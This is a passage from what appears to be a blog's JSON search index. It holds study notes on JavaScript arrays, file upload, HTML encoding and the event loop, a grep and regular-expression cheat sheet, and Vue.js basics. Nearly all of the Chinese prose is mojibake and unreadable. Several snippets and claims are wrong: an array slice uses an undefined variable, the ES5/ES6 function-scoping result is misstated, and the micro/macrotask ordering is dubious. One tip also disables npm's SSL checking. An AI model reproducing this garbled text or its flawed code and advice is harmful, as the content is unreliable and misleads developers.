å¯ä»¥æ£€æµ‹æ˜¯ES5è¿˜æ˜¯ES6 function f() { console.log(&#39;I am outside!&#39;); } (function () { if(false) { // é‡å¤å£°æ˜ä¸€æ¬¡å‡½æ•°f,ES5ä¼šè¾“å‡º&#39;i am insider&#39;, ES6ä¼šè¾“å‡º&#39;i am outsider&#39; function f() { console.log(&#39;I am inside!&#39;); } } f(); }()); javaScript debugçš„æ–¹æ³•ï¼šé€‰ä¸­ä¸€ä¸ªhtml çš„tagï¼Œbreak on ã€‚ã€‚ã€‚ è‡ªç„¶ä¼šåœ¨æ‰§è¡Œåˆ°çš„æ—¶å€™åœä¸‹æ¥ï¼Œevalulate valueéœ€è¦è‡ªå·±åœ¨consoleé‡Œé¢æ•²ï¼ˆæ³¨æ„æ­¤æ—¶åº”è¯¥ä½äºSourcesæ ‡ç­¾é¡µä¸‹ï¼‰ã€‚ json objectæœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œè¡¨é¢å…¶æ‰€ä»£è¡¨çš„ç±»å‹ã€‚ jsè¿­ä»£ä¸€ä¸ªæ•°ç»„çš„æ–¹æ³•ï¼š for (var i = 0; i &lt; array.length; i++) { // array[i] } for (var i = 0,len=array.length; i &lt; len; i++) { // array[i] } array.forEach(function(item){ // item }) // ç”¨äºåˆ—å‡ºå¯¹è±¡æ‰€æœ‰çš„å±æ€§ var obj = { name: &#39;test&#39;, color: &#39;red&#39;, day: &#39;sunday&#39;, number: 5 } for (var key in obj) { console.log(obj[key]) } // // es6 for (variable of iterable) { } array.map(function(item){ }) array.filter(function(item){ }) jsæ“ä½œæ•°ç»„çš„æ–¹æ³•çœŸçš„ä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ï¼Œä¹ æƒ¯è¿™ç§å‡½æ•°å¼ä¹¦å†™æ–¹å¼å°±å¥½ someArray = [{name:&quot;Kristian&quot;, lines:&quot;2,5,10&quot;}, {name:&quot;John&quot;, lines:&quot;1,19,26,96&quot;}]; //1 someArray.shift(); // first element removed //2 someArray = someArray.slice(1); // first element removed //3 someArray.splice(0, 1); // first element removed //ç¬¬äºŒä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯0å¼€å§‹çš„ï¼Œç­‰åŒäºremoveByIndex //4 someArray.pop(); // last element removed //5 someArray = someArray.slice(0, a.length - 1); // last element removed //6 someArray.length = someArray.length - 1; // last element removed //ä¸Šé¢è¿™äº›removeçš„æ–¹æ³•è¿”å›çš„éƒ½æ˜¯è¢«removeçš„å¯¹è±¡ let arrayWithoutKristian = someArray.filter(item =&gt; (item.name != &quot;Kristian&quot;)) åŸºæœ¬ä¸Šå°±è¿™äº›äº†å‚è€ƒ å¼‚å¸¸æ•è·(try catchä¹Ÿæœ‰) javaScriptæ“ä½œcookie: è¿™ç§æ–¹å¼å°±æ˜¯ç»™Stringå…¨å±€æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œå½“ç„¶ä¸æ˜¯è¯´æ¨èè¿™ä¹ˆå¹² String.prototype.hashCode = function() { var hash = 0, i, chr; if (this.length === 0) return hash; for (i = 0; i &lt; this.length; i++) { chr = this.charCodeAt(i); hash = (hash &lt;&lt; 5) - hash + chr; hash |= 0; // Convert to 32bit integer } return hash; }; string concatnateçš„æ–¹æ³•ä¹Ÿæœ‰ï¼Œç„¶è€Œæœ€å¿«çš„æ–¹å¼è¿˜æ˜¯ä½¿ç”¨+=è¿™ç§ var hello = &#39;Hello, &#39;; console.log(hello.concat(&#39;Kevin&#39;, &#39;. Have a nice day.&#39;)); XMLHttpRequest Level 2æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æ¥å£FormData.åˆ©ç”¨FormDataå¯¹è±¡,æˆ‘ä»¬å¯ä»¥é€šè¿‡JavaScriptç”¨ä¸€äº›é”®å€¼å¯¹æ¥æ¨¡æ‹Ÿä¸€ç³»åˆ—è¡¨å•æ§ä»¶,æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨XMLHttpRequestçš„send()æ–¹æ³•æ¥å¼‚æ­¥çš„æäº¤è¿™ä¸ªâ€è¡¨å•â€.æ¯”èµ·æ™®é€šçš„ajax,ä½¿ç”¨FormDataçš„æœ€å¤§ä¼˜ç‚¹å°±æ˜¯æˆ‘ä»¬å¯ä»¥å¼‚æ­¥ä¸Šä¼ ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶. FileReader api &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;/head&gt; &lt;form onsubmit=&quot;return false;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;file_base64&quot; id=&quot;file_base64&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileup&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; onclick=&quot;$.post(&#39;./uploader.php&#39;, $(this).parent().serialize());&quot;&gt; &lt;/form&gt; &lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;#fileup&quot;).change(function(){ var v = $(this).val(); var reader = new FileReader(); reader.readAsDataURL(this.files[0]); reader.onload = function(e){ console.log(e.target.result); $(&#39;#file_base64&#39;).val(e.target.result); }; }); }); &lt;/script&gt; indexed db api htmlé‡Œé¢æœ‰ä¸€äº›å¥‡æ€ªçš„ç¬¦å·â€œ &amp; â€œ åœ¨htmlé‡Œé¢ç­‰åŒäºâ€&amp;â€ampersandå†’å·(â€œ)ä¼šå˜æˆâ€ &quot; â€œè¿™ç§ web apiæœ‰ä¸€äº›ç”¨çš„ä¸å¤šçš„ä¸œè¥¿:File,Blob,ArrayBuffercreateObjectURLæ–¹æ³• TextUtils.java /** * Html-encode the string. * @param s the string to be encoded * @return the encoded string */ public static String htmlEncode(String s) { StringBuilder sb = new StringBuilder(); char c; for (int i = 0; i &lt; s.length(); i++) { c = s.charAt(i); switch (c) { case &#39;&lt;&#39;: sb.append(&quot;&amp;lt;&quot;); //$NON-NLS-1$ break; case &#39;&gt;&#39;: sb.append(&quot;&amp;gt;&quot;); //$NON-NLS-1$ break; case &#39;&amp;&#39;: sb.append(&quot;&amp;amp;&quot;); //$NON-NLS-1$ break; case &#39;\\&#39;&#39;: //http://www.w3.org/TR/xhtml1 // The named character reference &amp;apos; (the apostrophe, U+0027) was introduced in // XML 1.0 but does not appear in HTML. Authors should therefore use &amp;#39; instead // of &amp;apos; to work as expected in HTML 4 user agents. sb.append(&quot;&amp;#39;&quot;); //$NON-NLS-1$ break; case &#39;&quot;&#39;: sb.append(&quot;&amp;quot;&quot;); //$NON-NLS-1$ break; default: sb.append(c); } } return sb.toString(); } /** è§¦æ§äº‹ä»¶å¯¹è±¡ä¸­åŒ…å«äº†äº‹ä»¶çš„åæ ‡ï¼Œè¿™ä¸ªæœ‰event.x,event.pageX,event.clientXç­‰ç­‰ Event Loopå‰ç«¯ç»å…¸é¢è¯•é¢˜: ä»è¾“å…¥URLåˆ°é¡µé¢åŠ è½½å‘ç”Ÿäº†ä»€ä¹ˆï¼ŸJSçš„è§£ææ˜¯ç”±æµè§ˆå™¨ä¸­çš„JSè§£æå¼•æ“å®Œæˆçš„ã€‚JSæ˜¯å•çº¿ç¨‹è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨åŒä¸€ä¸ªæ—¶é—´å†…åªèƒ½åšä¸€ä»¶äº‹ï¼Œæ‰€æœ‰çš„ä»»åŠ¡éƒ½éœ€è¦æ’é˜Ÿï¼Œå‰ä¸€ä¸ªä»»åŠ¡ç»“æŸï¼Œåä¸€ä¸ªä»»åŠ¡æ‰èƒ½å¼€å§‹ã€‚ä½†æ˜¯åˆå­˜åœ¨æŸäº›ä»»åŠ¡æ¯”è¾ƒè€—æ—¶ï¼Œå¦‚IOè¯»å†™ç­‰ï¼Œæ‰€ä»¥éœ€è¦ä¸€ç§æœºåˆ¶å¯ä»¥å…ˆæ‰§è¡Œæ’åœ¨åé¢çš„ä»»åŠ¡ï¼Œè¿™å°±æ˜¯ï¼šåŒæ­¥ä»»åŠ¡(synchronous)å’Œå¼‚æ­¥ä»»åŠ¡(asynchronous)ã€‚JSçš„æ‰§è¡Œæœºåˆ¶å°±å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªä¸»çº¿ç¨‹åŠ ä¸Šä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—(task queue)ã€‚åŒæ­¥ä»»åŠ¡å°±æ˜¯æ”¾åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œçš„ä»»åŠ¡ï¼Œå¼‚æ­¥ä»»åŠ¡æ˜¯æ”¾åœ¨ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ã€‚æ‰€æœ‰çš„åŒæ­¥ä»»åŠ¡åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆ;å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æœå°±ä¼šåœ¨ä»»åŠ¡é˜Ÿåˆ—ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ï¼›è„šæœ¬è¿è¡Œæ—¶å…ˆä¾æ¬¡è¿è¡Œæ‰§è¡Œæ ˆï¼Œç„¶åä¼šä»ä»»åŠ¡é˜Ÿåˆ—é‡Œæå–äº‹ä»¶ï¼Œè¿è¡Œä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸æ–­é‡å¤çš„ï¼Œæ‰€ä»¥åˆå«åšäº‹ä»¶å¾ªç¯(Event loop)ã€‚ å‚è€ƒ5 åˆ†é’Ÿå½»åº•æ˜ç™½ JSONPjavaScript algorithmsä¸¤ä¸ªå…³äºasynchronous javaScriptçš„è§†é¢‘ï¼Œä¸€ä¸ªè§£é‡Šäº†Event Loopçš„æ„Ÿå¿µï¼Œå¦ä¸€ä¸ªè®²åˆ°äº†PromiseåŸºäºmicroTaskçš„åŸç†ã€‚è²åˆ©æ™®Â·ç½—ä¼¯èŒ¨ï¼šåˆ°åº•ä»€ä¹ˆæ˜¯Event Loopå‘¢ï¼Ÿ | æ¬§æ´² JSConf 2014 Asynchrony: Under the Hood - Shelley Vohr - JSConf EU 2018 ä½¿ç”¨Atomçš„æ—¶å€™ï¼ŒæŒ‰ä¸‹ctrl+shift+i ï¼Œä¼šå‘ç°åŸæ¥atomç¼–è¾‘é¡µé¢å°±ç‰¹ä¹ˆæ˜¯ä¸€ä¸ªç½‘é¡µã€‚javaScriptè‡ªå·±çš„Utils MicroTaskå’ŒMacroTaskçš„æ‰§è¡Œé¡ºåºæ˜¯ï¼šStack -&gt; MacroTask -&gt; MicroTask å‚è€ƒ ç”±äºjavaScriptä½¿ç”¨çš„æ˜¯UCS-2ç¼–ç ï¼ˆä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºç ç‚¹ï¼Œåªèƒ½è¡¨ç¤ºUnicodeåŸºæœ¬å¹³é¢å†…çš„ç ç‚¹ï¼‰ï¼Œç¢°åˆ°emojiè¿™ç±»å­—ç¬¦çš„æ—¶å€™ï¼Œstring.lengthå°±é ä¸ä½äº†,å¯ä»¥ä½¿ç”¨Array.from(str).length tbd[ES6 Proxy]æ‰‹åŠ¨å®ç°promise array removeAtIndex è¿˜ä¸å¦‚ç”¨underscore.js Array.prototype.reduceï¼ˆThe reduce() method executes a reducer function (that you provide) on each element of the array, resulting in a single output value.ï¼‰å°±æ˜¯æŠŠæ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ å‚ä¸è¿ç®—ï¼Œå¾—å‡ºä¸€ä¸ªå”¯ä¸€çš„ç»“æœã€‚","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"}]},{"title":"æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ","date":"2017-09-10T23:10:05.000Z","path":"2017/09/10/2017-09-10-wielding-regular-expressions/","text":"å…³äºæ­£åˆ™çš„ä¸€äº›æ”¶é›† javaScriptä¸­çš„æ­£åˆ™æ¯”å¦‚è¯´webpack.config.jsä¸­ï¼Œloaderæ¨¡å—æœ‰: { ... test: /\\.css$/, ... } nginxçš„configæ–‡ä»¶ä¸­ä¹Ÿè¦å†™æ­£åˆ™ ç¬¬ä¸€ä¸ªæ­£æ–œæ å’Œæœ€åä¸€ä¸ªæ­£æ–œæ è¡¨ç¤ºæ­£åˆ™çš„å¼€å§‹å’Œç»“æŸï¼Œåæ–œæ è¡¨ç¤ºåé¢é‚£ä¸ªç‚¹å°±å½“åšä¸€ä¸ªæ–‡å­—çš„ç‚¹æ¥å¤„ç†ï¼Œ$ä»£è¡¨ä»¥cssç»“æŸWe need more Pictures ^è¡¨ç¤ºå¼€å¤´ï¼Œ$è¡¨ç¤ºç»“å°¾ ## djangoçš„urlä¸­æ˜¯è¿™æ ·çš„ ä¸€èˆ¬æƒ…å†µä¸‹ä¸è¦ä¹±ç”¨æ­£åˆ™ ä»digitalOceançš„ grepæ•™ç¨‹ä¸­æŠ„æ¥ä¸€äº›using-grep-regular-expressions-to-search-for-text-patterns-in-linuxgrep(global regular expression print)åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œä¸åŒºåˆ†å¤§å°å†™ grep -i â€œsometextâ€ filennameåœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶ä¸­é€’å½’æŸ¥æ‰¾å«æœ‰ç‰¹å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶ grep -r â€œsometextâ€ * grep -v â€œtheâ€ BSD //åœ¨BSDè¿™ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾ä¸åŒ…å«â€theâ€è¿™ä¸ªå•è¯çš„çš„è¡Œï¼ˆå¯¹ï¼Œä¸€è¡Œä¸€è¡Œçš„æ‰¾ï¼‰ v çš„æ„æ€æ˜¯â€œâ€“invert-matchâ€ grep -vn â€œtheâ€ BSD //nçš„æ„æ€æ˜¯æ˜¾ç¤ºè¡Œå· â€œâ€“line-numberâ€ è¿™ä¿©å’Œdjangoé‡Œé¢çš„url.pyå¾ˆåƒ// grep â€œ^GNUâ€ GPL-3 // only mach â€œGNUâ€ if it occurs at the very beginning of a line.(åªä¼šåŒ¹é…ä¸Šä»¥GNUå¼€å¤´çš„)// grep â€œand$â€ GPL-3 // match every line ending with the word â€œandâ€ in the following regular expression: ï¼ˆåªä¼šåŒ¹é…ä¸Šä»¥andç»“æŸçš„ï¼‰ // grep â€œ..ceptâ€ GPL-3 // â€œ.â€çš„æ„æ€æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œanything that has two characters and then the string â€œceptâ€, ï¼ˆä¸¤ä¸ªå­—ç¬¦åŠ ä¸Šceptçš„ï¼‰ // grep â€œt[wo]oâ€ GPL-3 // find the lines that contain â€œtooâ€ or â€œtwoâ€ï¼Œä¸­é—´çš„å•è¯å¯ä»¥æ˜¯wä¹Ÿå¯ä»¥æ˜¯o // grep â€œ[^c]odeâ€ GPL-3 // é™¤äº†â€™câ€™ä»¥å¤–ä»€ä¹ˆå­—æ¯éƒ½å¯ä»¥ï¼Œå¤§å†™çš„â€™Câ€™ä¹Ÿä¼šåŒ¹é…ä¸Š // grep â€œ^[A-Z]â€ GPL-3 //ä»»ä½•ä»¥ä¸€ä¸ªå¤§å†™å­—æ¯å¼€å¤´çš„// grep â€œ^[[:upper:]]â€ GPL-3 //è¿™ä¸ªä¹Ÿæ˜¯æ‰¾å¤§å†™å­—æ¯å¼€å¤´çš„ï¼Œ:upperå«åšPOSIX character classesï¼Œæ¯”ä¸Šé¢æ›´åŠ å‡†ç¡®ä¸€äº› // one of the most commonly used meta-characters is the â€œâ€œ, which means â€œrepeat the previous character or expression zero or more timesâ€.â€â€œæ˜¯é‡å¤å‰é¢çš„expressionçš„æ„æ€ï¼Œè€Œä¸æ˜¯ä»»æ„å­—ç¬¦çš„æ„æ€ï¼Œä»»æ„å­—ç¬¦åº”è¯¥ç”¨â€.â€ // grep â€œ([A-Za-z ]*)â€ GPL-3 //æ‰¾åˆ°æ‰€æœ‰å°æ‹¬å·åŒ…èµ·æ¥çš„ï¼Œå°æ‹¬å·é‡Œé¢åªæœ‰å°å†™æˆ–è€…å¤§å†™å­—æ¯æˆ–è€…ç©ºæ ¼çš„è¡Œ // grep â€œ^[A-Z].*.$â€ GPL-3 // any line that begins with a capital letter and ends with a periodï¼ˆå¤§å†™å­—æ¯å¼€å¤´ï¼Œä¸­é—´é‚£ä¸ªç‚¹è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œåæ–œæ è¡¨ç¤ºè½¬ä¹‰å­—ç¬¦ï¼‰ // egrep å’Œgrep -E æ˜¯ä¸€ä¸ªæ„æ€eçš„æ„æ€æ˜¯extended regular expressionsï¼ˆExtended regular expressions include all of the basic meta-characters, along with additional meta-characters to express more complex matches.ç¿»è¯‘ä¸‹å°±æ˜¯èƒ½å¤Ÿä½¿ç”¨æ›´å¤šçš„æ­£åˆ™ï¼‰ // grep -E â€œ(GPL|General Public License)â€ GPL-3 //åŒ…å«GPLæˆ–è€…General Public Licenseçš„è¡Œ // grep -E â€œ(copy)?rightâ€ GPL-3 //*å·çš„æ„æ€æ˜¯é‡å¤ä¹‹å‰çš„patternæ— æ•°æ¬¡ï¼Œ?æ˜¯é‡å¤0æˆ–è€…1æ¬¡ï¼Œæ‰€ä»¥è¿™ä¸ªåŒ¹é…ä¸Šçš„æ˜¯copyrightæˆ–è€…right //grep -E â€œfree[^[:space:]]+â€ GPL-3 //+å·è¡¨ç¤ºä¸€æ¬¡æˆ–è€…å¤šæ¬¡ï¼Œå’Œ*å·®ä¸å¤šï¼Œä½†æ˜¯+å·è‡³å°‘å¾—æœ‰ä¸€æ¬¡ã€‚æ‰€ä»¥è¿™ä¸ªåŒ¹é…ä¸ŠfreeåŠ ä¸Šä¸€ä¸ªæˆ–è€…å¤šä¸ªéç©ºæ ¼ //grep -E â€œ[AEIOUaeiou]{3}â€ GPL-3 //å‰é¢çš„*å·è¡¨ç¤ºé‡å¤å¤šæ¬¡ï¼Œ.å·è¡¨ç¤ºä»»æ„å­—ç¬¦,+å·è¡¨ç¤ºé‡å¤è‡³å°‘ä¸€æ¬¡ï¼Œé‚£ä¹ˆæŒ‡å®šé‡å¤næ¬¡å°±è¦ç”¨èŠ±æ‹¬å·åŒ…èµ·æ¥ã€‚è¿™å¥è¯çš„æ„æ€æ˜¯AEIOUaeioué‡Œé¢ä»»æ„å­—ç¬¦è¿åœ¨ä¸€èµ·å‡ºç°æ­£å¥½ä¸‰æ¬¡ //grep -E â€œ[[:alpha:]]{16,20}â€ GPL-3 //If we want to match any words that have between 16 and 20 characters.ä»»ä½•åŒ…å«16-20ä¸ªå­—æ¯çš„å•è¯ fgrepä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼Œåªèƒ½å®ç°å…¨éƒ¨å…³é”®å­—åŒ¹é…ï¼Œç”¨å¤„ä¸å¤§ Linux ä¸­ grep å‘½ä»¤çš„ 12 ä¸ªå®è·µä¾‹å­ Cè¯­è¨€ç‰ˆæœ¬çš„æ­£åˆ™regex.h å‚è€ƒ DFAå’ŒNFA Learn regex the easy way å¤§éƒ¨åˆ†å›¾ç‰‡æ¥è‡ªå¿…åº”å£çº¸","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"VueJså­¦ä¹ ç¬”è®°","date":"2017-09-08T21:41:43.000Z","path":"2017/09/08/2017-09-08-all-about-Vue/","text":"Vue Jså­¦ä¹ ç¬”è®° æœ‰å¥è¯æ”¾åœ¨å‰é¢ï¼Œæ‰€æœ‰çš„javaScriptåº“éƒ½æ¯”ä¸ä¸ŠVanilla JSï¼Œå³åŸç”Ÿjsä»£ç ã€‚ 1. å‰æä½¿ç”¨cmder ,å®‰è£…äº†nodejsåŸºæœ¬å‘½ä»¤ npm install npm run dev npm è®¾ç½®æ·˜å®é•œåƒ npm config set registry https://registry.npm.taobao.org æˆ–è€…ç›´æ¥ç”¨æœ¬åœ°ssä»£ç†è®¾ç½®proxy npm config set strict-ssl falsenpm config set registry â€œhttp://registry.npmjs.org/&quot;npm config set proxy http://127.0.0.1:1080 ## ä»¥ä¸Šä¸‰å¥è¯è®¾ç½®ä»£ç†npm config list ##åˆ—å‡ºå½“å‰æ‰€æœ‰çš„è®¾ç½®npm config get stuff ##æ¯”å¦‚è¯´registryç­‰ç­‰ ä¸Šé¢çš„npm run run devåªæ˜¯ä¸ºäº†æ–¹ä¾¿æœ¬åœ°å¼€å‘ï¼Œå…·æœ‰live reloadåŠŸèƒ½ã€‚å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œéœ€è¦åœ¨CIæœåŠ¡å™¨ä¸Šè¿è¡Œ npm run build ç„¶åæŠŠdistæ–‡ä»¶å¤¹ä¸­çš„é™æ€æ–‡ä»¶æ¨é€åˆ°æ­£å¼æœåŠ¡å™¨åœ¨æœ¬åœ°èµ·nginxï¼Œè®¾ç½®å¥½config,port,locationä»€ä¹ˆçš„ï¼Œç„¶åæŠŠdistæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰ä¸œè¥¿å¤åˆ¶åˆ°ngix configçš„ç›®å½•ä¸‹ã€‚ç„¶åç›´æ¥åœ¨æµè§ˆå™¨é‡Œé¢localhostæ‰“å¼€æŸ¥çœ‹ï¼Œè¿™æ˜¯ç”Ÿäº§ç¯å¢ƒçš„å¤§è‡´æè¿°ï¼Œå®é™…è¿‡ç¨‹ä¸­ä»£ç è¿˜éœ€è¦ç»å†å¼€å‘æœºå™¨ï¼Œç¼–è¯‘æœºå™¨ï¼Œæµ‹è¯•æœºå™¨ï¼Œcdnæœºå™¨ç­‰ç­‰ç¯èŠ‚ã€‚ importè¯­æ³•:ä»åˆ«çš„vueæ–‡ä»¶ä¸­å¯¼å…¥æ•°æ®ï¼šimport Data from ./xxx/stuff.vueå…¶å®å’Œpythonå¾ˆåƒ ä¸€äº›å¸¸ç”¨çš„æ ‡ç­¾ template æ ‡ç­¾ç”¨äºæ˜¾ç¤ºæ¨¡æ¿ï¼Œå†…éƒ¨å¯ä»¥ä½¿ç”¨è·å–jsonå¯¹è±¡çš„æ•°æ® data æ™®é€šå±æ€§ï¼Œæ ‡ç­¾ç”¨äºå­˜å‚¨jsonç±»å‹çš„æ•°æ®ï¼Œæ˜¯å±äºè¿™ä¸ªå®ä¾‹çš„å˜é‡ methods æ ‡ç­¾ç”¨äºå£°æ˜æ–¹æ³•ï¼Œå†…éƒ¨ä½¿ç”¨this.xxxå¯ä»¥è·å¾—dataä¸­çš„jsonå¯¹è±¡ã€‚åœ¨htmlé‡Œé¢ä¸éœ€è¦thisï¼Œåœ¨exportè¯­å¥é‡Œé¢éœ€è¦ components æ ‡ç­¾ç”¨äºå¼•å…¥å¯å¤ç”¨çš„æ¨¡æ¿,ç”¨äºæ³¨å†Œ computed è®¡ç®—å±æ€§ï¼Œcomputedå’Œdataä¸€æ ·ï¼Œä¹Ÿæ˜¯æ–¹æ³•ï¼Œåªä¸è¿‡åªæ˜¯è¿”å›äº†å˜é‡çš„å€¼çš„ä¸€ä»½copyã€‚ä¸ä¼šå½±å“dataçš„å€¼ var vm = new Vue({ el: &#39;#example&#39;, data: { message: &#39;Hello&#39; }, computed: { // è®¡ç®—å±æ€§çš„ getter reversedMessage: function () { // `this` æŒ‡å‘ vm å®ä¾‹ return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;) } } }) ä½ å¯ä»¥åƒç»‘å®šæ™®é€šå±æ€§ä¸€æ ·åœ¨æ¨¡æ¿ä¸­ç»‘å®šè®¡ç®—å±æ€§ã€‚Vue çŸ¥é“ vm.reversedMessage ä¾èµ–äº vm.messageï¼Œå› æ­¤å½“ vm.message å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ– vm.reversedMessage çš„ç»‘å®šä¹Ÿä¼šæ›´æ–°ã€‚è€Œä¸”æœ€å¦™çš„æ˜¯æˆ‘ä»¬å·²ç»ä»¥å£°æ˜çš„æ–¹å¼åˆ›å»ºäº†è¿™ç§ä¾èµ–å…³ç³»ï¼šè®¡ç®—å±æ€§çš„ getter å‡½æ•°æ˜¯æ²¡æœ‰å‰¯ä½œç”¨ (side effect) çš„ï¼Œè¿™ä½¿å®ƒæ›´æ˜“äºæµ‹è¯•å’Œç†è§£ã€‚æ™®é€šå±æ€§æ›´æ”¹çš„è¯å°±çœŸçš„æ”¹äº†ï¼Œè®¡ç®—å±æ€§åªæ˜¯æŠŠè¿™ç§æ“ä½œé¢„æœŸçš„ç»“æœè¿”å›ï¼Œå¹¶ä¸ä¼šä¿®æ”¹åŸæ¥çš„å€¼ã€‚è¿˜æœ‰ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œè®¡ç®—å±æ€§çš„å€¼ä¾èµ–äºæ™®é€šå±æ€§çš„å€¼ï¼Œå‰è€…ä¸æ›´æ”¹çš„è¯ï¼Œåè€…ç›´æ¥è¿”å›ç¼“å­˜çš„å€¼ã€‚æ‰€ä»¥è¿™ç§è·å–æ—¶é—´çš„ä¸œè¥¿å°±ä¸è¦æ”¾åœ¨è®¡ç®—å±æ€§é‡Œäº†ã€‚ computed: { now: function () { return Date.now() } } ä¸€äº›å¸¸ç”¨çš„äº‹ä»¶ç»‘å®š: v-if=â€™â€™ //ç§»é™¤æˆ–è€…æ˜¾ç¤ºæŸä¸ªTagï¼Œ(display:noneæ˜¯éšè—æˆ–æ˜¾ç¤º) v-on:click=â€™somefunctionâ€™ //ç‚¹å‡»äº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘æŸä¸ªmethod template v-is=â€™some_template_nameâ€™ //ç”¨äºåœ¨é¡µé¢æ¨¡æ¿ä¸­å¯¼å…¥ç°æˆçš„æ¨¡æ¿ ç¼©å†™ï¼š v-onçš„ç¼©å†™æ˜¯@ç¬¦å· v-bind:çš„ç¼©å†™å°±æ˜¯: é‚£ä¸ªå†’å· 1.1 Dynamic Componentsé¡µé¢ä¸­éœ€è¦éšæ—¶å±•ç¤ºä¸åŒtemplateæ˜¯ï¼Œå¯ä»¥ä½¿ç”¨componentæ ‡ç­¾ã€‚ // Imports import formOne from &#39;./components/formOne.vue&#39;; import formTwo from &#39;./components/formTwo.vue&#39;; &lt;form-one&gt;&lt;/form-one&gt; //è¿™å’Œä¸‹é¢è¿™ç§å†™æ³•æ˜¯ä¸€æ ·çš„ &lt;component v-bind:is=&#39;component&#39;&gt;&lt;/component&gt; //componentæ ‡ç­¾æ³¨å†Œåœ¨dataä¸­ï¼Œå¯ä»¥éšæ—¶æ”¹å˜ã€‚ä¾‹å¦‚ &lt;button v-on:click=&quot;component=&#39;form-one&#39;&quot;&gt;Show form one&lt;/button&gt; &lt;button v-on:click=&quot;component=&#39;form-two&#39;&quot;&gt;Show form two&lt;/button&gt; 1.2 InputBindingå°†inputæ ‡ç­¾ä¸­ç”¨æˆ·è¾“å…¥çš„æ–‡å­—æ˜¾ç¤ºåœ¨ä¸€ä¸ªtagä¸­ //åœ¨templateä¸­ &lt;input type=&quot;text&quot; v-model.lazy=&#39;title&#39; required/&gt; //lazyæ˜¯æŒ‡previewéƒ¨åˆ†åªä¼šåœ¨ç‚¹å‡»åæ˜¾ç¤ºå†…å®¹ //åœ¨dataä¸­æ³¨å†Œ data () { return { title :&#39;&#39;, content: &#39;&#39; } } åœ¨éœ€è¦å±•ç¤ºå†…å®¹çš„æ ‡ç­¾ä¸­å¯ä»¥å®æ—¶è·å–å†…å®¹ å¦‚&lt;p&gt;{{title}}&lt;/p&gt;&gt; æˆ–è€… data () { return { blog:{ title :&#39;&#39;, content: &#39;&#39;, categories:[] } } } dataä¸­è¿”å›çš„æ˜¯ä¸€ä¸ªjson objectï¼Œjsonæœ¬èº«çš„å®šä¹‰å°±æ˜¯(JavaScript Object Notation)ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥å°†æ‰€æœ‰éœ€è¦çš„å˜é‡å­˜å‚¨åœ¨ä¸€ä¸ªobject,å½“ç„¶ï¼Œè¿™é‡Œé¢å­˜æ•°ç»„ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ 1.3 Checkbox Binding&lt;div id=&quot;checkboxes&quot;&gt; &lt;label&gt;Apple&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;apple&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;Juice&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;juice&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;Panda&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;panda&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;rocky&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;rocky&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;moon&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;moon&quot; v-model=&quot;blog.categories&quot;&gt; &lt;/div&gt; åœ¨é¢„è§ˆåŒºï¼Œå¯ä»¥è¿™æ ·å±•ç¤º &lt;ul&gt; &lt;li v-for=&#39;cat in blog.categories&#39;&gt;{{cat}}&lt;/li&gt; &lt;/ul&gt; 